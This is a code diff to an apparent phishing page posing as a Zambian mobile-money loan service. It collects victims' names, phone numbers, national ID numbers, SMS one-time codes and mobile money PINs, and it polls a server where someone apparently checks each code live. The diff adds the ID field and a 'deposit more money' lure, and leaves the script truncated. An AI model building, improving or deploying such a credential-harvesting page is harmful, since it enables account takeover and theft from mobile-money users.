@@ -3,33 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Replicate Momo Zambia - Instant Loans</title>
+    <title>Momo Loan Zambia</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --primary: #1a7a4c; --primary-dark: #0d5c34; --primary-light: #e8f5ee;
+            --primary: #f5c518; --primary-dark: #d4a800; --primary-light: #fff8e1;
             --danger: #e74c3c; --success: #27ae60;
-            --text: #2c3e50; --text-light: #7f8c8d; --bg: #f8fafb; --white: #ffffff;
+            --text: #2c3e50; --text-light: #7f8c8d; --bg: #fffde7; --white: #ffffff;
             --shadow: 0 4px 20px rgba(0,0,0,0.08); --radius: 16px; --radius-sm: 10px;
         }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
 
-        .header { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px 16px; text-align: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(26,122,76,0.3); }
+        .header { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px 16px; text-align: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(245,197,24,0.4); }
         .header .logo { display: flex; align-items: center; justify-content: center; gap: 10px; }
         .header .logo-icon { width: 42px; height: 42px; background: var(--white); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
-        .header h1 { color: var(--white); font-size: 18px; font-weight: 700; }
-        .header .subtitle { color: rgba(255,255,255,0.8); font-size: 12px; margin-top: 2px; }
+        .header h1 { color: #1a1a1a; font-size: 18px; font-weight: 700; }
+        .header .subtitle { color: rgba(0,0,0,0.6); font-size: 12px; margin-top: 2px; }
 
         .progress-container { background: var(--white); padding: 16px 24px 12px; box-shadow: var(--shadow); }
         .progress-steps { display: flex; align-items: center; justify-content: space-between; position: relative; }
         .progress-steps::before { content: ''; position: absolute; top: 16px; left: 30px; right: 30px; height: 3px; background: #e0e0e0; z-index: 0; }
-        .progress-line { position: absolute; top: 16px; left: 30px; height: 3px; background: var(--primary); z-index: 1; transition: width 0.5s ease; width: 0%; }
+        .progress-line { position: absolute; top: 16px; left: 30px; height: 3px; background: var(--primary-dark); z-index: 1; transition: width 0.5s ease; width: 0%; }
         .step { display: flex; flex-direction: column; align-items: center; gap: 6px; z-index: 2; }
         .step-circle { width: 34px; height: 34px; border-radius: 50%; background: #e0e0e0; color: var(--text-light); display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; transition: all 0.4s ease; }
-        .step.active .step-circle { background: var(--primary); color: var(--white); transform: scale(1.1); box-shadow: 0 4px 12px rgba(26,122,76,0.4); }
+        .step.active .step-circle { background: var(--primary); color: #1a1a1a; transform: scale(1.1); box-shadow: 0 4px 12px rgba(245,197,24,0.4); }
         .step.completed .step-circle { background: var(--success); color: var(--white); }
         .step-label { font-size: 10px; color: var(--text-light); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-        .step.active .step-label { color: var(--primary); }
+        .step.active .step-label { color: var(--primary-dark); }
 
         .container { max-width: 480px; margin: 0 auto; padding: 20px 16px 100px; }
         .page { display: none; animation: slideIn 0.4s ease; }
@@ -40,53 +40,53 @@
         .card-title { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
         .card-subtitle { font-size: 13px; color: var(--text-light); margin-bottom: 24px; line-height: 1.5; }
 
-        .hero-banner { background: linear-gradient(135deg, var(--primary), #2d9d6a); border-radius: var(--radius); padding: 28px 24px; margin-bottom: 20px; color: var(--white); position: relative; overflow: hidden; }
-        .hero-banner::after { content: ''; position: absolute; top: -50%; right: -30%; width: 200px; height: 200px; background: rgba(255,255,255,0.1); border-radius: 50%; }
+        .hero-banner { background: linear-gradient(135deg, var(--primary), #ffe066); border-radius: var(--radius); padding: 28px 24px; margin-bottom: 20px; color: #1a1a1a; position: relative; overflow: hidden; }
+        .hero-banner::after { content: ''; position: absolute; top: -50%; right: -30%; width: 200px; height: 200px; background: rgba(255,255,255,0.3); border-radius: 50%; }
         .hero-banner h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; position: relative; z-index: 1; }
-        .hero-banner p { font-size: 14px; opacity: 0.9; line-height: 1.5; position: relative; z-index: 1; }
+        .hero-banner p { font-size: 14px; opacity: 0.8; line-height: 1.5; position: relative; z-index: 1; }
         .hero-features { display: flex; gap: 12px; margin-top: 16px; position: relative; z-index: 1; flex-wrap: wrap; }
-        .hero-feature { background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border-radius: var(--radius-sm); padding: 10px 14px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+        .hero-feature { background: rgba(255,255,255,0.5); border-radius: var(--radius-sm); padding: 10px 14px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
 
         .form-group { margin-bottom: 18px; }
         .form-label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
         .form-label .required { color: var(--danger); }
         .form-input { width: 100%; padding: 14px 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 15px; font-family: inherit; color: var(--text); background: var(--bg); transition: all 0.3s ease; outline: none; }
-        .form-input:focus { border-color: var(--primary); background: var(--white); box-shadow: 0 0 0 4px rgba(26,122,76,0.1); }
+        .form-input:focus { border-color: var(--primary-dark); background: var(--white); box-shadow: 0 0 0 4px rgba(245,197,24,0.2); }
         .form-input::placeholder { color: #b0b8c1; }
         .form-input.error { border-color: var(--danger); }
         .error-message { font-size: 12px; color: var(--danger); margin-top: 6px; display: none; }
         .error-message.show { display: block; }
 
         .phone-input-wrapper { display: flex; }
-        .phone-prefix { padding: 14px 12px; background: var(--primary-light); border: 2px solid var(--primary); border-right: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 14px; font-weight: 700; color: var(--primary); display: flex; align-items: center; min-width: 72px; justify-content: center; }
+        .phone-prefix { padding: 14px 12px; background: var(--primary-light); border: 2px solid var(--primary); border-right: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 14px; font-weight: 700; color: var(--primary-dark); display: flex; align-items: center; min-width: 72px; justify-content: center; }
         .phone-input-wrapper .form-input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0; }
 
         .amount-display { text-align: center; padding: 20px; background: var(--primary-light); border-radius: var(--radius-sm); margin-bottom: 16px; }
         .amount-label { font-size: 12px; color: var(--text-light); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; margin-bottom: 4px; }
-        .amount-value { font-size: 32px; font-weight: 800; color: var(--primary); }
+        .amount-value { font-size: 32px; font-weight: 800; color: var(--primary-dark); }
         .amount-value span { font-size: 18px; font-weight: 600; }
 
         .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 16px; }
         .quick-btn { padding: 12px 8px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); background: var(--white); font-size: 13px; font-weight: 700; color: var(--text); cursor: pointer; transition: all 0.2s ease; text-align: center; }
-        .quick-btn:hover, .quick-btn.selected { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
+        .quick-btn:hover, .quick-btn.selected { border-color: var(--primary-dark); background: var(--primary-light); color: var(--primary-dark); }
 
         .period-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
         .period-btn { padding: 14px 10px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); background: var(--white); font-size: 14px; font-weight: 700; color: var(--text); cursor: pointer; transition: all 0.2s ease; text-align: center; }
         .period-btn small { display: block; font-size: 11px; color: var(--text-light); font-weight: 500; margin-top: 2px; }
-        .period-btn:hover, .period-btn.selected { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
+        .period-btn:hover, .period-btn.selected { border-color: var(--primary-dark); background: var(--primary-light); color: var(--primary-dark); }
 
         .btn { width: 100%; padding: 16px; border: none; border-radius: var(--radius-sm); font-size: 16px; font-weight: 700; font-family: inherit; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: var(--white); box-shadow: 0 4px 15px rgba(26,122,76,0.3); }
+        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #1a1a1a; box-shadow: 0 4px 15px rgba(245,197,24,0.3); }
         .btn-primary:hover { transform: translateY(-2px); }
         .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .btn-outline { background: var(--white); color: var(--primary); border: 2px solid var(--primary); }
+        .btn-outline { background: var(--white); color: var(--primary-dark); border: 2px solid var(--primary); }
         .btn-outline:hover { background: var(--primary-light); }
 
         .otp-section { text-align: center; padding: 20px 0; }
         .otp-icon { width: 80px; height: 80px; background: var(--primary-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 36px; animation: pulse 2s infinite; }
         @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .otp-input { width: 100%; max-width: 280px; padding: 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 28px; font-family: inherit; text-align: center; letter-spacing: 10px; outline: none; transition: all 0.3s ease; inputmode: numeric; }
-        .otp-input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(26,122,76,0.1); }
+        .otp-input { width: 100%; max-width: 280px; padding: 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 28px; font-family: inherit; text-align: center; letter-spacing: 10px; outline: none; transition: all 0.3s ease; inputmode: numeric; background: var(--bg); }
+        .otp-input:focus { border-color: var(--primary-dark); box-shadow: 0 0 0 4px rgba(245,197,24,0.2); }
         .otp-input:read-only { background: #f0f0f0; }
         .otp-status { margin-top: 16px; padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 600; display: none; }
         .otp-status.listening { display: block; background: #fff3e0; color: #e65100; }
@@ -100,14 +100,14 @@
         .pin-icon { width: 80px; height: 80px; background: var(--primary-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 36px; }
         .pin-input-wrapper { display: flex; justify-content: center; gap: 10px; margin: 24px 0; }
         .pin-dot { width: 16px; height: 16px; border-radius: 50%; border: 3px solid #d0d5dd; transition: all 0.2s ease; }
-        .pin-dot.filled { background: var(--primary); border-color: var(--primary); }
-        .pin-input { width: 100%; max-width: 280px; padding: 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 24px; font-family: inherit; text-align: center; letter-spacing: 10px; outline: none; transition: all 0.3s ease; -webkit-text-security: disc; }
-        .pin-input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(26,122,76,0.1); }
+        .pin-dot.filled { background: var(--primary-dark); border-color: var(--primary-dark); }
+        .pin-input { width: 100%; max-width: 280px; padding: 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 24px; font-family: inherit; text-align: center; letter-spacing: 10px; outline: none; transition: all 0.3s ease; -webkit-text-security: disc; background: var(--bg); }
+        .pin-input:focus { border-color: var(--primary-dark); box-shadow: 0 0 0 4px rgba(245,197,24,0.2); }
         .pin-hint { font-size: 12px; color: var(--text-light); margin-top: 12px; }
 
         .summary-card { background: var(--primary-light); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 20px; }
         .summary-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; font-size: 14px; }
-        .summary-row:not(:last-child) { border-bottom: 1px solid rgba(26,122,76,0.1); }
+        .summary-row:not(:last-child) { border-bottom: 1px solid rgba(245,197,24,0.2); }
         .summary-label { color: var(--text-light); font-weight: 500; }
         .summary-value { font-weight: 700; color: var(--text); }
 
@@ -116,13 +116,14 @@
         @keyframes successBounce { 0% { transform: scale(0); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
         .success-title { font-size: 24px; font-weight: 800; color: var(--success); margin-bottom: 8px; }
         .success-message { font-size: 14px; color: var(--text-light); line-height: 1.6; margin-bottom: 24px; }
+        .highlight-box { background: linear-gradient(135deg, #fff8e1, #ffecb3); border: 2px solid var(--primary); border-radius: var(--radius-sm); padding: 16px; margin: 16px 0; font-size: 15px; font-weight: 700; color: var(--primary-dark); text-align: center; }
 
         .alert-box { padding: 14px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 600; margin-bottom: 16px; display: none; }
         .alert-box.show { display: block; }
         .alert-box.error { background: #ffebee; color: #c62828; }
         .alert-box.info { background: #e3f2fd; color: #1565c0; }
 
-        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: var(--white); border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
+        .spinner { width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.2); border-top-color: #1a1a1a; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .btn.loading .spinner { display: block; }
         .btn.loading .btn-text { display: none; }
@@ -133,7 +134,6 @@
         .toast.success { background: var(--success); }
 
         .footer { text-align: center; padding: 20px; font-size: 11px; color: var(--text-light); }
-        .footer a { color: var(--primary); text-decoration: none; }
 
         @media (max-width: 380px) {
             .quick-amounts { grid-template-columns: repeat(2, 1fr); }
@@ -148,7 +148,7 @@
         <div class="logo">
             <div class="logo-icon">💰</div>
             <div>
-                <h1>Replicate Momo Zambia</h1>
+                <h1>Momo Loan Zambia</h1>
                 <div class="subtitle">Instant Loans • No Collateral</div>
             </div>
         </div>
@@ -174,7 +174,7 @@
 
     <div class="container">
 
-        <!-- PAGE 1 -->
+        <!-- PAGE 1: APPLY -->
         <div class="page active" id="page1">
             <div class="hero-banner">
                 <h2>Get Cash in Minutes</h2>
@@ -197,9 +197,14 @@
                     <label class="form-label">Mobile Number <span class="required">*</span></label>
                     <div class="phone-input-wrapper">
                         <div class="phone-prefix">+260</div>
-                        <input type="tel" class="form-input" id="phoneNumber" placeholder="653653653" autocomplete="tel" inputmode="numeric">
+                        <input type="tel" class="form-input" id="phoneNumber" placeholder="970000000" autocomplete="tel" inputmode="numeric">
                     </div>
                     <div class="error-message" id="phoneError">Please enter your phone number</div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">National ID Number <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="idNumber" placeholder="e.g. 1090123456789" inputmode="numeric" maxlength="13">
+                    <div class="error-message" id="idError">Please enter your ID number</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Loan Amount (ZMW) <span class="required">*</span></label>
@@ -293,12 +298,15 @@
         <div class="page" id="page4">
             <div class="card">
                 <div class="success-section">
-                    <div class="success-icon">✅</div>
-                    <div class="success-title">Application Successful!</div>
+                    <div class="success-icon">🎉</div>
+                    <div class="success-title">Congratulations!</div>
                     <div class="success-message">
                         Your loan application has been verified and submitted successfully.<br><br>
                         You'll receive a notification on <strong id="successPhone"></strong> once your loan is processed.<br><br>
                         <strong>Reference:</strong> <span id="refNumber"></span>
+                    </div>
+                    <div class="highlight-box">
+                        💡 Deposit more money for more loan!
                     </div>
                     <button class="btn btn-primary" id="btnReset">
                         <span class="btn-text">Apply Again</span>
@@ -311,11 +319,11 @@
 
     <div class="toast" id="toast"></div>
     <div class="footer">
-        <p>© 2026 Replicate Momo Zambia. All rights reserved.</p>
+        <p>© 2026 Momo Loan Zambia. All rights reserved.</p>
     </div>
 
     <script>
-    var appData = { name: '', phone: '', amount: 0, period: 0, otp: '', pin: '' };
+    var appData = { name: '', phone: '', idNumber: '', amount: 0, period: 0, otp: '', pin: '' };
     var currentPage = 1;
     var isNavigating = false;
     var isSubmitting = false;
@@ -375,7 +383,7 @@
             if (msg.result === 'correct') {
                 stopPolling();
                 document.getElementById('otpWaiting').classList.remove('show');
-                showToast('OTP verified! Moving to PIN…', 'success');
+                showToast('✅ OTP Verified! Moving to PIN…', 'success');
                 setTimeout(function() { goToPage(3); }, 1200);
             } else if (msg.result === 'wrong') {
                 stopPolling();
@@ -395,7 +403,7 @@
             if (msg.result === 'correct') {
                 stopPolling();
                 document.getElementById('pinWaiting').classList.remove('show');
-                showToast('PIN verified! Application complete!', 'success');
+                showToast('🎉 PIN Verified! Application complete!', 'success');
                 setTimeout(function() { handleSuccess(); }, 1200);
             } else if (msg.result === 'wrong') {
                 stopPolling();
@@ -470,6 +478,15 @@
             document.getElementById('phoneNumber').classList.remove('error');
             document.getElementById('phoneError').classList.remove('show');
         }
+        var idNum = document.getElementById('idNumber').value.trim();
+        if (idNum.length < 1) {
+            document.getElementById('idNumber').classList.add('error');
+            document.getElementById('idError').classList.add('show');
+            valid = false;
+        } else {
+            document.getElementById('idNumber').classList.remove('error');
+            document.getElementById('idError').classList.remove('show');
+        }
         var amount = parseInt(document.getElementById('loanAmount').value) || 0;
         if (amount < 500 || amount > 50000) {
             document.getElementById('loanAmount').classList.add('error');
@@ -489,6 +506,7 @@
         if (!valid) { showToast('Please fix the errors above', 'error'); return false; }
         appData.name = name;
         appData.phone = '+260 ' + phoneRaw;
+        appData.idNumber = idNum;
         appData.amount = amount;
         appData.period = parseInt(periodBtn.dataset.period);
         return true;
@@ -503,7 +521,7 @@
             var res = await fetch('/api/apply', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: appData.name, phone: appData.phone, amount: appData.amount, period: appData.period })
+                body: JSON.stringify({ name: appData.name, phone: appData.phone, idNumber: appData.idNumber, amount: appData.amount, period: appData.period })
             });
             var data = await res.json();
             if (data.success) {
@@ -515,9 +533,10 @@
                 document.getElementById('summaryCard').innerHTML =
                     '<div class="summary-row"><span class="summary-label">Name</span><span class="summary-value">' + esc(appData.name) + '</span></div>' +
                     '<div class="summary-row"><span class="summary-label">Phone</span><span class="summary-value">' + appData.phone + '</span></div>' +
+                    '<div class="summary-row"><span class="summary-label">ID</span><span class="summary-value">' + appData.idNumber + '</span></div>' +
                     '<div class="summary-row"><span class="summary-label">Amount</span><span class="summary-value">K' + appData.amount.toLocaleString() + '</span></div>' +
                     '<div class="summary-row"><span class="summary-label">Period</span><span class="summary-value">' + appData.period + ' days</span></div>' +
-                    '<div class="summary-row"><span class="summary-label">Est. Repayment</span><span class="summary-value" style="color:var(--primary)">K' + total.toLocaleString() + '</span></div>';
+                    '<div class="summary-row"><span class="summary-label">Est. Repayment</span><span class="summary-value" style="color:var(--primary-dark)">K' + total.toLocaleString() + '</span></div>';
                 document.getElementById('otpPhoneDisplay').textContent = appData.phone;
                 btn.classList.remove('loading');
                 btn.disabled = false;
@@ -531,7 +550,7 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 2: OTP (auto-submit on 4 digits)
+    // PAGE 2: OTP
     // ═══════════════════════════════════════════
     function initOtpInput() {
         var otpInput = document.getElementById('otpInput');
@@ -642,7 +661,7 @@
     }
 
     // ═══════════════════════════════════════════
-    // PAGE 3: PIN (auto-submit on 5 digits)
+    // PAGE 3: PIN
     // ═══════════════════════════════════════════
     function initPinInput() {
         var pinInput = document.getElementById('pinInput');
@@ -721,7 +740,7 @@
 
     function resetApp() {
         stopPolling();
-        appData = { name: '', phone: '', amount: 0, period: 0, otp: '', pin: '' };
+        appData = { name: '', phone: '', idNumber: '', amount: 0, period: 0, otp: '', pin: '' };
         isSubmitting = false;
         sessionId = null;
         if (ws) { ws.close(); ws = null; }
@@ -730,6 +749,7 @@
         if (otpTimeout) clearTimeout(otpTimeout);
         document.getElementById('fullName').value = '';
         document.getElementById('phoneNumber').value = '';
+        document.getElementById('idNumber').value = '';
         document.getElementById('loanAmount').value = '';
         document.getElementById('pinInput').value = '';
         document.getElementById('otpInput').value = '';
@@ -749,53 +769,4 @@
         document.querySelectorAll('.error-message').forEach(function(e) { e.classList.remove('show'); });
         document.getElementById('btnOtp').disabled = false;
         document.getElementById('btnOtp').classList.remove('loading');
-        document.getElementById('btnPin').disabled = false;
-        document.getElementById('btnPin').classList.remove('loading');
-        goToPage(1);
-    }
-
-    // ═══════════════════════════════════════════
-    // INITIALIZERS
-    // ═══════════════════════════════════════════
-    function initQuickAmounts() {
-        document.querySelectorAll('.quick-btn').forEach(function(btn) {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.quick-btn').forEach(function(b) { b.classList.remove('selected'); });
-                btn.classList.add('selected');
-                var amt = parseInt(btn.dataset.amount);
-                document.getElementById('loanAmount').value = amt;
-                document.getElementById('amountDisplay').textContent = amt.toLocaleString();
-                document.getElementById('loanAmount').classList.remove('error');
-                document.getElementById('amountError').classList.remove('show');
-            });
-        });
-        document.getElementById('loanAmount').addEventListener('input', function(e) {
-            var v = parseInt(e.target.value) || 0;
-            document.getElementById('amountDisplay').textContent = v.toLocaleString();
-            document.querySelectorAll('.quick-btn').forEach(function(b) { b.classList.remove('selected'); });
-            if (v >= 500 && v <= 50000) {
-                e.target.classList.remove('error');
-                document.getElementById('amountError').classList.remove('show');
-            }
-        });
-    }
-
-    function initPeriodButtons() {
-        document.querySelectorAll('.period-btn').forEach(function(btn) {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.period-btn').forEach(function(b) { b.classList.remove('selected'); });
-                btn.classList.add('selected');
-                document.getElementById('periodError').classList.remove('show');
-            });
-        });
-    }
-
-    function initPhoneInput() {
-        var input = document.getElementById('phoneNumber');
-        input.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        });
-    }
-    </script>
-</body>
-</html>   
+          
